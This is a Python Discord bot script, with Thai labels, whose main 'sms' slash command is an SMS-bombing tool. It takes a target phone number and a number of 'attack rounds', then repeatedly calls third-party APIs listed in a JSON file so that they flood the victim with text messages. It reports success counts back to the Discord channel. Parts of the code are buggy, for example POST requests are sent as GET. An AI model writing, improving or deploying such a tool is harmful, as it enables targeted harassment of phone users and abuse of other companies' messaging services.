from nextcord import Client, Interaction, SlashOption, Embed
from nextcord.ext import commands
import json, requests

# bot class
from bot import botInteraction

GUILD_TEST = 969659996600160326

class Client(Client):
    def get_interaction(self, data, *, cls=Interaction):
        return super().get_interaction(data, cls=botInteraction)

client = Client()

@client.slash_command(guild_ids=[GUILD_TEST], description="Ping command")
async def ping(interaction: Interaction):
  await interaction.respon.send_message('Pong!')

@client.slash_command(guild_ids=[GUILD_TEST], description="ส่งสแปม SMS")
async def sms(interaction: Interaction,
    phone: int = SlashOption(name="phone", description="หมายเลขโทรศัพท์เป้าหมาย", required=True), roundNum: int = SlashOption(name="num", description="จำนวนรอบที่โจมตี", required=True)):
    
    phoneNum = str(phone)
    apiCount = 0
    apiSuccesses = 0
    apiFailed = 0

    #init interaction message
    msg = await interaction.send_spamSMS_embed(
        phone=phone,
        counts=[apiCount, apiSuccesses, apiFailed],
        status=0
    )

    jsonfile = open("apiData.json")
    apis = json.load(jsonfile)

    for num in range(0, roundNum):
        for api in apis:
            # url
            if api["removeZero"]:
                url = api["url"].format(phone=phoneNum[1:])
            else:
                url = api["url"].format(phone=phoneNum)

            #headers
            if api["headers"] == None:
                headers = {
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
                }
            else:
                headers = api["headers"]

            # data
            requestData = api["data"]
            if api["data"] != None:
                if type(requestData) is dict:
                    for key in requestData.keys():
                        for value in requestData.values():
                            if api["removeZero"]:
                                requestData[key] = value.format(phone=phoneNum[1:])
                            else:
                                requestData[key] = value.format(phone=phoneNum)
                else:
                    if api["removeZero"]:
                        requestData = requestData.format(phone=phoneNum[1:])
                    else:
                        requestData = requestData.format(phone=phoneNum)

            #json
            jsonData = api["json"]
            if jsonData != None:
                for key in jsonData.keys():
                    for value in jsonData.values():
                        if api["removeZero"]:
                            jsonData[key] = value.format(phone=phoneNum[1:])
                        else:
                            jsonData[key] = value.format(phone=phoneNum)

            # send req
            try:
                if api["type"] == "GET":
                    result = requests.get(url, headers=headers, data=requestData, json=jsonData)
                elif api["type"] == "POST":
                    result = requests.get(url, headers=headers, data=requestData, json=jsonData)
                if str(result.status_code).startswith('2'):
                    apiSuccesses += 1
                else:
                    apiFailed += 1

                # Debug print status code
                #print(result.status_code)

            except Exception as e:
                print("Error: ", e)
                apiFailed += 1
                pass
            apiCount += 1

        # update interaction message per round
        await interaction.edit_spamSMS_embed(
            interaction=msg,
            phone=phone,
            counts=[apiCount, apiSuccesses, apiFailed],
            status=1
        )
    # send end interaction message
    await interaction.edit_spamSMS_embed(
        interaction=msg,
        phone=phone,
        counts=[apiCount,apiSuccesses,apiFailed],
        status=3
    )
    jsonfile.close()

client.run("TOKEN")